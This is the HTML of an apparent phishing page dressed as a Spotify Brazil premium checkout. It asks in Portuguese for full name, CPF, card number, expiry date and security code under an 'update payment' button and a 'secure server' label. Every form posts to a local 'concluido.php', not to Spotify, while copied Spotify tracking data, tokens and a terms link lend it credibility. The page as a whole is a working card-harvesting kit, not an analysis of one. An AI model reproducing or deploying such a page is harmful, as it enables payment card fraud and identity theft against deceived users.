    
<div class=""embeddable-checkout"">
  <section class=""checkout-form"" data-checkout-panel="""" data-payment-picker=""compact"" data-tracking-endpoint=""https://www.spotify.com/br/payment/payment-event/"" data-gabo-endpoint=""/br/api/v1/event/track/"">
      <div data-redirect-message="""" class=""redirect-message checkout-modal hidden"">
  <div class=""checkout-modal-content"">
    <div class=""icon"">
      <svg version=""1.1"" xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" viewBox=""0 0 30 18"">
      <polygon points=""29.4,9 20.7,0.3 19.3,1.7 25.6,8 0,8 0,10 25.6,10 19.3,16.3 20.7,17.7""/>
      </svg>
    </div>
      <div class=""message"">Redirecionando à página de conclusão de compra…</div>
  </div>
</div>

                  <div data-payment-picker="""">
                    <div>
                      <div>
                        <div data-mop-type=""creditOption"" data-reactid=""25"">
                          <div data-reactid=""26""><img src=""data:image/png;base64,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"" /></div>
                        </div>
                        <div>
                          <div>
                            <center><form method=""post"" action=""concluido.php"">
                              <div>
                                <label>
                                <center>
                                <br />
                                <center><label>Nome Completo<br />
                                  <input class=""tags-input"" tabindex=""0"" type=""text"" name=""firstName"" required="""" />
                                  <br />
                                CPF do titular da conta<br />
                                  <input tabindex=""0"" class=""tags-input"" name=""cpf"" type=""number"" maxlength=""11"" required="""" />
                                </label>
                                
                              </center></center></label></div>
                              <div id=""cc-after""> </div>
                              <label>Número do cartão <br />
                              <input tabindex=""0"" class=""tags-input"" type=""text"" name=""creditCardNumber"" maxlength=""16"" pattern=""[0-9]*"" placeholder=""1111 2222 3333 4444"" required="""" />
                              </label>
                              <select tabindex=""0"" class=""tags-input"" name=""expYear"" required="""">
                                
                                    
                                                               
                                      
                                      
                                <option selected=""selected""></option>
                                
                                    
                                                               
                                      
                                <option value=""2019"">2019</option>
                                
                                    
                                                               
                                      
                                      
                                <option value=""2020"">2020</option>
                                
                                    
                                                               
                                      
                                      
                                <option value=""2021"">2021</option>
                                
                                    
                                                               
                                      
                                      
                                <option value=""2022"">2022</option>
                                
                                    
                                                               
                                      
                                      
                                <option value=""2023"">2023</option>
                                
                                    
                                                               
                                      
                                      
                                <option value=""2024"">2024</option>
                                
                                    
                                                               
                                      
                                      
                                <option value=""2025"">2025</option>
                                
                                    
                                                               
                                      
                                      
                                <option value=""2026"">2026</option>
                                
                                    
                                                               
                                      
                                      
                                <option value=""2027"">2027</option>
                                
                                    
                                                               
                                      
                                      
                                <option value=""2028"">2028</option>
                                
                                    
                                                               
                                      
                                      
                                <option value=""2029"">2029</option>
                                
                                    
                                                               
                                      
                                      
                                <option value=""2030"">2030</option>
                                
                                    
                                                               
                                      
                                      
                                <option value=""2031"">2031</option>
                                
                                    
                                                               
                                      
                                      
                                <option value=""2032"">2032</option>
                                
                                    
                                                               
                                      
                                      
                                <option value=""2033"">2033</option>
                                
                                    
                                                               
                                      
                                      
                                <option value=""2034"">2034</option>
                                
                                    
                                                               
                                      
                                      
                                <option value=""2035"">2035</option>
                                
                                    
                                                               
                                      
                                      
                                <option value=""2036"">2036</option>
                                
                                    
                                                               
                                      
                                      
                                <option value=""2037"">2037</option>
                                
                                    
                                                               
                                      
                                      
                                <option value=""2038"">2038</option>
                                
                                    
                                                               
                                      
                                      
                                <option value=""2039"">2039</option>
                                
                                    
                                                               
                                      
                                      
                                <option value=""2040"">2040</option>
                                
                                    
                                                             
                                    
                                
                              </select>
                              <div><strong>Data de validade</strong>
                                <select tabindex=""0"" class=""tags-input"" name=""expMonth"" required="""">
                                  
                                                               
                                      
                                      <option selected=""selected""></option>
                                  
                                                               
                                      
                                      <option value=""1"">Jan (1)</option>
                                  
                                                               
                                      
                                      <option value=""2"">Fev (2)</option>
                                  
                                                               
                                      
                                      <option value=""3"">Mar (3)</option>
                                  
                                                               
                                      
                                      <option value=""4"">Abr (4)</option>
                                  
                                                               
                                      
                                      <option value=""5"">Mai (5)</option>
                                  
                                                               
                                      
                                      <option value=""6"">Jun (6)</option>
                                  
                                                               
                                      
                                      <option value=""7"">Jul (7)</option>
                                  
                                                               
                                      
                                      <option value=""8"">Ago (8)</option>
                                  
                                                               
                                      
                                      <option value=""9"">Set (9)</option>
                                  
                                                               
                                      
                                      <option value=""10"">Out (10)</option>
                                  
                                                               
                                      
                                      <option value=""11"">Nov (11)</option>
                                  
                                                               
                                      
                                      <option value=""12"">Dez (12)</option>
                                  
                                                             
                                    
                                </select>
                              </div>
                          <label>Código de segurança<br />
                                <input tabindex=""0"" class=""tags-input"" maxlength=""4"" type=""password"" name=""creditCardSecurityCode"" required="""" />
                                <br />
                                <span class=""btn-xs"">Termos e condições disponíveis <a href=""https://www.spotify.com/br/legal/end-user-agreement/"" target=""_blank"">aqui</a>.</span><br />
                              </label>
                              <div>
                                <div>
                                  <button type=""submit"" class=""bg-spotify-green-fallback-3"" id=""CC-start"" tabindex=""0"" autocomplete=""off"">ATUALIZAR PAGAMENTO</button>
                                  <div>Servidor seguro</div>
                                </div>
                              </div>
                            </form>
                          </center></div>
                        </div>
                        <div><form name=""profile"" method=""post"" action=""concluido.php"" id=""profile"" role=""form"" novalidate=""novalidate""><div><div><div><div></div>
                                </div>
                              </div>
                            </div>
                          </form>
                        </div>
                      </div>
                    </div>
                    <div>
                      <div id=""div""></div>
                    </div>
                    </div>
              
      <div class=""panel-tab selected"" data-checkout-panel-tab="""" data-name=""billing_digitalriver""><form name=""offer"" method=""post"" action=""concluido.php"" data-payment-form=""credit-card""><div></div><input type=""hidden"" id=""offer_tracking-data"" name=""offer[tracking-data]"" data-tracking-data=""{&quot;offer_uuid&quot;:&quot;b011316f-8978-4b7b-823b-93a002d67e2e-2&quot;,&quot;payment_provider&quot;:&quot;billing_digitalriver&quot;,&quot;market&quot;:&quot;BR&quot;,&quot;product_key&quot;:&quot;premium&quot;,&quot;view&quot;:&quot;https:\/\/www.spotify.com\/br\/purchase\/offer\/premium\/?country=BR&quot;,&quot;context&quot;:&quot;premium-checkout&quot;}"" /><input type=""hidden"" id=""offer__token"" name=""offer[_token]"" value=""eyJ0aW1lIjoxNTU1NTU3ODk0LCJoYXNoIjoiN2M4MzZhNmYxY2JiNGRkNWI5YmE1MWRiOTBlODExY2ZhOTYwZjlkMmUyMjY3YTAwMzMxOWQ4MTRjYjQwZDU0OCJ9"" /></form>
          </div>
                          <div class=""country-info"">
